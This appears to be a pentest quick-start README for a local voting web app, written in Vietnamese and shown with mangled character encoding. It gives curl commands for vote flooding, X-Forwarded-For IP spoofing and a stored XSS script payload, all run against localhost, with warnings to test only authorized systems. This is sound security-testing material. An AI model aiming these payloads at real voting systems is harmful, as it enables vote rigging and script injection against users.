# Pentest Quick Start Guide

HÆ°á»›ng dáº«n nhanh Ä‘á»ƒ báº¯t Ä‘áº§u pentest chá»©c nÄƒng voting.

## ğŸ¯ Má»¥c tiÃªu

Kiá»ƒm tra báº£o máº­t há»‡ thá»‘ng voting báº±ng cÃ¡ch:
1. Cháº¡y cÃ¡c test tá»± Ä‘á»™ng Ä‘á»ƒ phÃ¡t hiá»‡n lá»— há»•ng
2. XÃ¡c minh cÃ¡c vulnerability Ä‘Ã£ biáº¿t
3. Táº¡o report chi tiáº¿t vá» káº¿t quáº£

## âš¡ Quick Start (5 phÃºt)

### BÆ°á»›c 1: Setup mÃ´i trÆ°á»ng

```bash
# Clone repo (náº¿u chÆ°a cÃ³)
git clone <repo-url>
cd vote-anti-trick

# Install dependencies
yarn install

# Start database
docker-compose up -d

# Setup database
yarn prisma generate
yarn prisma migrate dev --name init

# Start application
yarn dev
```

### BÆ°á»›c 2: Táº¡o infrastructure Ä‘á»ƒ test

```bash
# Open trong browser
open http://localhost:3000

# Hoáº·c táº¡o qua API
curl -X POST http://localhost:3000/api/infrastructures \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test Infrastructure",
    "description": "For pentest purposes",
    "imageUrl": "https://via.placeholder.com/300"
  }'

# LÆ°u láº¡i infrastructure ID tá»« response
```

### BÆ°á»›c 3: Cháº¡y pentest tá»± Ä‘á»™ng

```bash
cd pentest-scripts

# Cháº¡y táº¥t cáº£ tests (recommended)
./run-all-tests.sh <your-infrastructure-id>

# Hoáº·c cháº¡y tá»«ng test riÃªng láº»
node 01-vote-flooding.js <infrastructure-id> 100
node 02-ip-spoofing.js <infrastructure-id> 50
node 05-input-validation.js <infrastructure-id>

# CSRF test (má»Ÿ trong browser)
open 03-csrf-attack.html
```

### BÆ°á»›c 4: Xem káº¿t quáº£

```bash
# Check report
cat pentest-scripts/test-results/pentest-report-*.txt

# Check database
docker-compose exec db psql -U vote -d vote_infrastructure

# SQL queries
SELECT infrastructure_id, COUNT(*) as votes
FROM votes
GROUP BY infrastructure_id;

SELECT ip_address, COUNT(*)
FROM votes
GROUP BY ip_address
ORDER BY COUNT(*) DESC;
```

### BÆ°á»›c 5: Cleanup

```bash
# Delete test votes
docker-compose exec db psql -U vote -d vote_infrastructure -c \
  "DELETE FROM votes WHERE voter_email LIKE '%@test.com';"

# Hoáº·c reset toÃ n bá»™
yarn prisma migrate reset
```

## ğŸ“Š Expected Results

Náº¿u há»‡ thá»‘ng cÃ³ lá»— há»•ng (nhÆ° hiá»‡n táº¡i), báº¡n sáº½ tháº¥y:

âœ… **Vote Flooding**: Táº¡o Ä‘Æ°á»£c 100+ votes mÃ  khÃ´ng bá»‹ block
âœ… **IP Spoofing**: Má»—i vote cÃ³ IP khÃ¡c nhau trong database
âœ… **Input Validation**: XSS payloads Ä‘Æ°á»£c lÆ°u vÃ o database
âœ… **CSRF**: Vote Ä‘Æ°á»£c táº¡o tá»« external domain

## ğŸ” Quick Tests (Manual)

### Test 1: Unlimited Voting (30 giÃ¢y)
```bash
# Vote 10 láº§n liÃªn tá»¥c
for i in {1..10}; do
  curl -X POST http://localhost:3000/api/infrastructures/<ID>/vote \
    -H "Content-Type: application/json" \
    -d '{"voterName":"Test","voterEmail":"test@test.com"}'
  echo " - Vote $i done"
done

# Expected: Táº¥t cáº£ votes Ä‘á»u thÃ nh cÃ´ng = VULNERABILITY
```

### Test 2: IP Spoofing (15 giÃ¢y)
```bash
# Vote vá»›i fake IP
curl -X POST http://localhost:3000/api/infrastructures/<ID>/vote \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 1.2.3.4" \
  -d '{"voterName":"Fake IP","voterEmail":"fake@test.com"}'

# Check database xem IP cÃ³ pháº£i 1.2.3.4 khÃ´ng
docker-compose exec db psql -U vote -d vote_infrastructure -c \
  "SELECT ip_address FROM votes ORDER BY created_at DESC LIMIT 1;"

# Expected: IP = 1.2.3.4 = VULNERABILITY
```

### Test 3: XSS Injection (20 giÃ¢y)
```bash
# Vote vá»›i XSS payload
curl -X POST http://localhost:3000/api/infrastructures/<ID>/vote \
  -H "Content-Type: application/json" \
  -d '{"voterName":"<script>alert(\"XSS\")</script>","voterEmail":"xss@test.com"}'

# Check database
docker-compose exec db psql -U vote -d vote_infrastructure -c \
  "SELECT voter_name FROM votes WHERE voter_email='xss@test.com';"

# Expected: Payload Ä‘Æ°á»£c lÆ°u nguyÃªn váº¹n = VULNERABILITY
```

## ğŸ“š TÃ i liá»‡u chi tiáº¿t

- **[PENTEST_VOTING.md](docs/PENTEST_VOTING.md)** - Guide Ä‘áº§y Ä‘á»§ vá»›i táº¥t cáº£ attack scenarios
- **[pentest-scripts/README.md](pentest-scripts/README.md)** - HÆ°á»›ng dáº«n sá»­ dá»¥ng tá»«ng script
- **[SECURITY.md](SECURITY.md)** - Tá»•ng quan vá» security vulnerabilities

## ğŸ› ï¸ Troubleshooting

### Problem: Server khÃ´ng cháº¡y
```bash
# Check port 3000
lsof -i :3000

# Restart server
yarn dev
```

### Problem: Database connection failed
```bash
# Check Docker
docker-compose ps

# Restart database
docker-compose restart db

# Check DATABASE_URL in .env
cat .env | grep DATABASE_URL
```

### Problem: Prisma client error
```bash
# Regenerate Prisma client
yarn prisma generate

# Check generated files
ls -la prisma/generated/
```

### Problem: "Infrastructure not found"
```bash
# List all infrastructures
curl http://localhost:3000/api/infrastructures

# Get correct ID from response
```

## ğŸ’¡ Tips

1. **Start simple**: Cháº¡y tá»«ng script riÃªng trÆ°á»›c khi cháº¡y full suite
2. **Check logs**: Xem application logs Ä‘á»ƒ hiá»ƒu behavior
3. **Use Prisma Studio**: `yarn prisma studio` Ä‘á»ƒ xem database visually
4. **Take notes**: Document káº¿t quáº£ cho report
5. **Backup**: Backup database trÆ°á»›c khi cháº¡y destructive tests

## âš ï¸ Warnings

- âŒ **KHÃ”NG** cháº¡y trÃªn production
- âŒ **KHÃ”NG** test há»‡ thá»‘ng khÃ´ng Ä‘Æ°á»£c phÃ©p
- âŒ **KHÃ”NG** commit test data vÃ o git
- âœ… **LUÃ”N** cleanup sau khi test
- âœ… **LUÃ”N** test trÃªn local/staging only

## ğŸ“ Learning Path

1. **Beginner**: Cháº¡y automated tests vÃ  Ä‘á»c output
2. **Intermediate**: Cháº¡y manual tests vá»›i curl, hiá»ƒu tá»«ng attack
3. **Advanced**: Modify scripts, táº¡o custom exploits
4. **Expert**: Implement fixes vÃ  verify vá»›i tests

## ğŸ“ˆ Next Steps

Sau khi hoÃ n thÃ nh pentest:

1. âœ… Review full report trong `pentest-scripts/test-results/`
2. âœ… Document findings trong format chuáº©n
3. âœ… Prioritize vulnerabilities by severity
4. âœ… Implement security fixes (see SECURITY.md)
5. âœ… Re-run tests Ä‘á»ƒ verify fixes
6. âœ… Add security tests vÃ o CI/CD pipeline

## ğŸ¤ Need Help?

- Check [docs/PENTEST_VOTING.md](docs/PENTEST_VOTING.md) for detailed guide
- Review [pentest-scripts/README.md](pentest-scripts/README.md) for script usage
- See [SECURITY.md](SECURITY.md) for vulnerability details

---

**Happy Hacking! ğŸ”**

(Remember: Only on authorized systems!)
